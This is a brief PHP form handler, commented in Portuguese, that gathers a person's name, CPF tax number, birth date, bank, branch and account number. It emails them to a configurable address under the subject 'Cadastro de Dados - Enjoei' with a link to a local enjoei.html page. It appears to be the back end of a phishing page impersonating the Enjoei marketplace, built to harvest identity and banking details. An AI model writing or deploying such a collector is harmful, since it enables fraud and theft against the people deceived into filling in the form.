<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nome = $_POST['nome'];
    $cpf = $_POST['cpf'];
    $nascimento = $_POST['nascimento'];
    $banco = $_POST['banco'];
    $agencia = $_POST['agencia'];
    $conta = $_POST['conta'];

    $email = "seu-email@dominio.com";  // Coloque seu e-mail aqui.
    $subject = "Cadastro de Dados - Enjoei";
    $message = "Olá! Aqui estão os dados cadastrados:\n\n" .
               "Nome: $nome\n" .
               "CPF: $cpf\n" .
               "Data de Nascimento: $nascimento\n" .
               "Banco: $banco\n" .
               "Agência: $agencia\n" .
               "Conta Bancária: $conta\n\n" .
               "Link para a página: http://127.0.0.1:5500/enjoei.html";
    $headers = "From: seu-email@dominio.com";

    if (mail($email, $subject, $message, $headers)) {
        echo "Email enviado com sucesso!";
    } else {
        echo "Erro ao enviar o email.";
    }
}
?>
